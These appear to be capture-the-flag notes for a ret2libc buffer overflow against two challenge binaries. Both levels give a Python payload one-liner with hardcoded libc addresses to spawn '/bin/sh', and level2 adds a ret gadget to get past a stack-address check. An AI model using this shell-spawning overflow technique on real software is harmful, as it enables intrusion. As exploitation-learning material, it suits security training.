Buffer Overflow - ret2libc

(python -c "print('A' * 76 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level1

'A' * 76 -> Size of the buffer
'\x60\xb0\xe6\xb7' -> Address of system
'\xe0\xeb\xe5\xb7' -> Address of exit to avoid segv
'\x58\xcc\xf8\xb7' -> Address of "/bin/sh" given to system

Then cat to avoid the shell to close

We have to bypass the stack address check
0x80484fb <p+39>        and    eax,0xb0000000
0x8048500 <p+44>        cmp    eax,0xb0000000

Before the ret2libc, we override the eip address with the address of a ret or a nop
0x804853e <p+106>               ret // or any addres in executable stack

(python -c 'print("\x90\x90\x90\x90"*20 +"\x3e\x85\x04\x08"+ "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")';cat) | ./level2
